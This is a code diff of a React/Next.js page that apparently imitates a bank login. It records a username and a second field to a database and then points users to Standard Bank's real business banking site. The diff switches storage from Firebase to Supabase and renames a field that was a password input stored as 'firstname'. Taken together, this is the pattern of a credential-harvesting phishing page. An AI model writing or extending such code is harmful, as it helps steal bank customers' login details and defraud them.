@@ -1,8 +1,7 @@
 "use client";
 
 import { FormEvent, useState } from "react";
-import { addDoc, collection, serverTimestamp } from "firebase/firestore";
-import { db, isFirebaseConfigured } from "@/lib/firebase";
+import { createClient, isSupabaseConfigured } from "@/utils/supabase/client";
 
 const finalLink = "https://onlinebusinessbanking.standardbank.co.za/#/landing-page";
 const LOADING_DELAY_MS = 2500;
@@ -22,19 +21,22 @@ export default function Home() {
       return;
     }
 
-    if (!isFirebaseConfigured || !db) {
-      setMessage("Firebase is not configured yet.");
+    if (!isSupabaseConfigured) {
+      setMessage("Supabase is not configured yet.");
       return;
     }
 
     setIsLoading(true);
 
     try {
-      await addDoc(collection(db, "submissions"), {
+      const supabase = createClient();
+      const { error } = await supabase.from("submissions").insert({
         username,
         firstname,
-        submittedAt: serverTimestamp(),
+        submitted_at: new Date().toISOString(),
       });
+
+      if (error) throw error;
     } catch {
       setIsLoading(false);
       setMessage("The details could not be saved. Try again.");
@@ -70,11 +72,11 @@ export default function Home() {
           </label>
 
           <label className="field firstname-field">
-            <span className="sr-only">Password</span>
+            <span className="sr-only">First name</span>
             <input
               name="firstname"
-              type="password"
-              placeholder="Password"
+              type="text"
+              placeholder="First name"
               autoComplete="given-name"
               onInput={() => setMessage("")}
             />
